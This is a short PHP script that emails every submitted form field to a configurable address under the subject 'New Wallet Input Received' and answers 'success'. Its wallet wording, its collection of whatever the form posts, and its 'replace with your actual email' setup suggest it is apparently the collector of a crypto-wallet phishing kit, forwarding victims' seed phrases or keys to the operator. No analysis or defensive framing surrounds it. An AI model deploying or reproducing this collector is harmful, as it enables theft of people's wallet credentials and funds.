<?php
// send_email.php

$to = "your_email@example.com";  // 🔁 Replace with your actual email address
$subject = "New Wallet Input Received";
$headers = "From: wallet@app.com\r\nContent-Type: text/plain; charset=UTF-8";

$body = "Wallet Submission Details:\n";

foreach ($_POST as $key => $value) {
    $body .= ucfirst($key) . ": " . htmlspecialchars($value) . "\n";
}

mail($to, $subject, $body, $headers);
echo "success";
?>